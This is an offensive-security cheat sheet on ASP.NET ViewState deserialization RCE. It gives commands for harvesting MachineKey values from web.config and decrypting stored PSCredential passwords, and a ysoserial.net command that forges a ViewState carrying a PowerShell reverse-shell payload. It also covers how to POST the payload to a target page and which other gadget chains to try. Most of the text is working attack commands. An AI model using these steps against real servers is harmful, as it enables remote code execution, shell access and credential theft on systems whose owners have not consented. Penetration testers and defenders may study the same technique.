# ASP.NET ViewState Deserialization RCE

If the `MachineKey` (validationKey + decryptionKey) is known, forge a ViewState payload that triggers deserialization RCE on the server.

## Collect MachineKey

```powershell
# Via web.config read (LFI, file disclosure):
type C:\inetpub\wwwroot\web.config | findstr -i "machineKey\|validationKey\|decryptionKey"

# Via PSCredential stored as CliXml (common in Windows configs):
$cred = Import-CliXml -Path creds.xml
$cred.GetNetworkCredential().Password
```

## Generate Malicious ViewState (ysoserial.net)

```powershell
# On Windows attacker machine:
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --decryptionalg="AES" \
  --decryptionkey="<DECRYPTION_KEY>" \
  --validationalg="SHA1" \
  --validationkey="<VALIDATION_KEY>" \
  -c "powershell -e <BASE64_REVSHELL>"
```

## Send Payload

POST to the vulnerable `.aspx` page with `__VIEWSTATE=<GENERATED_PAYLOAD>` and matching `__VIEWSTATEGENERATOR` value (copy from a legitimate request).

## Notes

- MachineKey may be hardcoded in `web.config`, `machine.config`, or leaked via LFI
- Target must be using non-encrypted ViewState or you need both validationKey + decryptionKey
- `TextFormattingRunProperties` gadget requires WPF assemblies (usually available on Windows Server)
- Also try `ActivitySurrogateSelector`, `TypeConfuseDelegate`, `WindowsIdentity` gadgets

## PSCredential CliXml Decryption

```powershell
# .xml files with PSCredential can be decrypted only by the same user on same machine:
$c = Import-CliXml credentials.xml
$c.GetNetworkCredential().Password

# Or export plain password:
[System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
  [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($c.Password)
)
```
